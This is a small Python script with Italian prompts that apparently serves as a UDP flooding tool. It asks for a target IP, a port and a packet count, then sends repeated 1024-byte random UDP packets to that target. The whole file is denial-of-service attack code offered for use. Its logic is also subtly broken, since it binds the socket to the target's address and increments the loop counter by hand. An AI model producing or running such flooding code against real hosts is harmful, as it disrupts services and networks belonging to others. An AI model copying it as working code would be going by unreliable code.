import random
import socket
import sys

ip = input("Inserisci IP target: \n")
port = input ("\nInserisci porta: \n")
q = input ("\nQuanti pacchetti vuoi inviare?: \n")

q = int(q)
port = int(port)

data = random.randbytes(1024)
#print (data)
                                                                #mancano controlli su ip e porta (es. se quest'ultima è aperta)
try:
        s = socket.socket (socket.AF_INET, socket.SOCK_DGRAM)
        s.bind((ip,port))
        #print(s)
        for x in range(q):
                s.sendto(data,(ip,port))
                #print(data)
                x+=1
                print("\ninviati " + str(x) + " pacchetti a " + str(ip))


except KeyboardInterrupt:
        print("\nOk ciao")
        sys.exit()

except:
        print("\nErrore!")
        sys.exit()
